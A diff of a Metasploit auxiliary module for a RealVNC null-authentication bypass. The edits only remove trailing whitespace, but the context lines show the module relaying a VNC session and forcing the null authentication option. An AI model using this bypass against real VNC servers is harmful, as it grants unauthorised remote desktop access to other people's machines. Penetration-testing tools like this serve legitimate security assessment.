@@ -14,7 +14,7 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 	include Msf::Exploit::Remote::Tcp
-	
+
 	def initialize(info = {})
 		super(update_info(info,
 			'Name'           => 'RealVNC NULL Authentication Mode Bypass',
@@ -66,7 +66,7 @@ class Metasploit3 < Msf::Auxiliary
 				print_error("The vncviewer does not appear to be installed, exiting...")
 				return nil
 			end
-			print_status("Spawning viewer thread...")	
+			print_status("Spawning viewer thread...")
 			view = framework.threads.spawn("VncViewerWrapper", false) {
 					system("vncviewer 127.0.0.1::#{datastore['LPORT']}")
 			}
@@ -75,7 +75,7 @@ class Metasploit3 < Msf::Auxiliary
 		# Establishes the connection between the viewier and the remote server
 		client = listener.accept
 		add_socket(client)
-		
+
 		# Closes the listener socket as it is no longer needed
 		listener.close
 
@@ -91,9 +91,9 @@ class Metasploit3 < Msf::Auxiliary
 		client.puts(serverhello)
 		clienthello = client.get_once
 		s.puts(clienthello)
-		
+
 		authmethods = s.read(2)
-		
+
 		print_status("Auth methods received. Sending null authentication option to client")
 		client.write("\x01\x01")
 		client.read(1)
@@ -121,11 +121,11 @@ class Metasploit3 < Msf::Auxiliary
 							s.put(data)
 						end
 					rescue
-						print_error("Client closed connection")	
+						print_error("Client closed connection")
 						closed = true
 					end
 				end
-				
+
 				if selected[0].include?(s)
 					begin
 						data = s.get_once
